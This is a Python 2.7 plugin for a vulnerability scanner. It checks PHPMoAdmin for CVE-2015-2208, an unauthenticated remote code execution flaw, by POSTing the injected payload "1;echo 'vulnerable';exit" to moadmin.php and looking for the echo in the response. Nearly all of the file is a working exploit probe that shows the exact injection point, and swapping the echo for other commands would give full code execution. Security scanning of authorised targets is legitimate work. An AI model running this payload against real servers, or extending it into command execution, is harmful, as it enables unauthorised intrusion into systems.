#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import * 

info = {
	'NAME':'PHPMoAdmin Unauthorized Remote Code Execution CVE-2015-2208',
	'AUTHOR':'yangbh',
	'TIME':'20150314',
	'WEB':'http://www.exploit-db.com/exploits/36251/',
	'DESCRIPTION':'PHPMoAdmin Unauthorized Remote Code Execution'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'PhpMoAdmin':
			return True
	return False

def Audit(services):
	url = services['url'] + '/moadmin.php'
	data = {'object':"1;echo 'vulnerable';exit"}
	rqu = requests.post(url,data=data)
	# print rqu.text
	if rqu.status_code==200 and 'vulnerable' in rqu.text:
		# print rqu.text
		logger(rqu.text)
		security_hole(url)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://example.com','cms':'PhpMoAdmin'}
	pprint(Audit(services))